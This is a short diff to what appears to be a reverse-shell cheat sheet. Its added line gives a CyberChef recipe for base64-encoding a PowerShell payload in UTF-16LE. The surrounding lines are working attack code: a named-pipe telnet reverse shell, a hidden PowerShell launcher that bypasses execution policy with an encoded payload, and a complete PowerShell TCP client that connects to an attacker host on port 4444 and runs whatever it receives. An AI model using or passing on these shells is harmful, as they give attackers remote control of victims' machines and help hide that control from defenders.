@@ -180,6 +180,8 @@ rm -f /tmp/f; mknod /tmp/f p && telnet 10.0.0.1 1234 0/tmp/p
 powershell -nop -noni -w hidden -ep bypass -e <BASE64_PAYLOAD>
 ```
 
+https://gchq.github.io/CyberChef -> ToBase64 -> Input -> UTF-16LE -> copy output
+
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('Y.Y.Y.Y',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
